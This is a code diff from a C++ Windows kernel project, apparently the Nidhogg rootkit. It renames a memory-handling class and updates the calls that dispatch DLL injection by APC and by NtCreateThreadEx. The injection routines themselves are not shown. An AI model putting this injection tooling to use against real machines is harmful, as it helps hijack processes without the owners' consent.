@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "DllInjectionParser.h"
-#include "MemoryUtils.h"
+#include "MemoryHandler.h"
 #include "ProcessHandler.h"
 
 DllInjectionParser::DllInjectionParser() {
@@ -43,26 +43,26 @@ NTSTATUS DllInjectionParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	switch (commandId) {
 	case Options::APC:
 	{
-		dllInfo.Type = APCInjection;
+		dllInfo.Type = InjectionType::APCInjection;
 
 		if (!Features.ApcInjection) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 
-		status = NidhoggMemoryUtils->InjectDllAPC(&dllInfo);
+		status = NidhoggMemoryHandler->InjectDllAPC(&dllInfo);
 		break;
 	}
 	case Options::Thread:
 	{
-		dllInfo.Type = NtCreateThreadExInjection;
+		dllInfo.Type = InjectionType::NtCreateThreadExInjection;
 
 		if (!Features.CreateThreadInjection) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 
-		status = NidhoggMemoryUtils->InjectDllThread(&dllInfo);
+		status = NidhoggMemoryHandler->InjectDllThread(&dllInfo);
 		break;
 	}
 	default:
